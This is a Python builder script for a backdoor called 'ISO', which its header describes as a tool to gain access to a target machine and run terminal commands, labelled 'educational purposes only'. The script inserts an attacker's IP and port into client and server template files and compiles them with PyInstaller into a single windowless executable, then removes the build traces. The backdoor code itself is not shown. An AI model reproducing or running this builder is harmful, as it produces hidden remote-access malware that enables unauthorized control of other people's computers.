'''

            ISO - In Side Out
            
        created by CookiesKush420
           github.com/Callumgm
       
       
    This a highly sophisticated backdoor that can be
    used to gain access to a target machine and execute terminal commands.
    
    CREATED FOR EDUCATIONAL PURPOSES ONLY.
     
'''

### System Modules ###
import os
import shutil


def build(IP, PORT, type):
    os.system("cls")
    # Copy the file to the build folder
    shutil.copy2(os.getcwd() + "\\" + type + "\\" + type + ".py", os.getcwd() + "\\" + type + ".py")

    # Open the file and read the contents and replace the IP and PORT
    with open(os.getcwd() + "\\" + type + ".py", "r") as file:
        data = file.read()
        data = data.replace("IP_HERE", IP)
        data = data.replace("PORT_HERE", PORT)

    # Write the new data to the file
    with open(os.getcwd() + "\\" + type + ".py", "w") as file:
        file.write(data)

    # Compile the file
    os.system("pyinstaller --onefile --noconsole " + os.getcwd() + "\\" + type + ".py")

    # Move exe to the current dir
    shutil.move(os.getcwd() + "\\" + "dist" + "\\" + type + ".exe", os.getcwd() + "\\" + type + ".exe")

    # Clean up folders
    try:
        shutil.rmtree(os.getcwd() + "\\build")
        shutil.rmtree(os.getcwd() + "\\dist")
        os.remove(os.getcwd() + "\\" + type + ".spec")
        os.remove(os.getcwd() + "\\" + type + ".py")
    except: pass


def build_client():
    IP   = str(input("IP: "))
    PORT = str(input("Port: "))
    build(IP, PORT, "client")


def build_server():
    IP   = str(input("IP: "))
    PORT = str(input("Port: "))
    build(IP, PORT, "server")


def main():
    os.system("cls")
    print("Welcome to the ISO Builder")
    print("""
    
    1) Build Client
    2) Build Server

    3) Exit
    
    """)

    choice = int(input("Choice: "))

    if choice == 1:
        os.system("cls")
        build_client()
        main()

    elif choice == 2:
        os.system("cls")
        build_server()
        main()

    elif choice == 3:
        os._exit(1)

    else:
        print("Invalid Choice")
        main()


if __name__ == "__main__":
    main()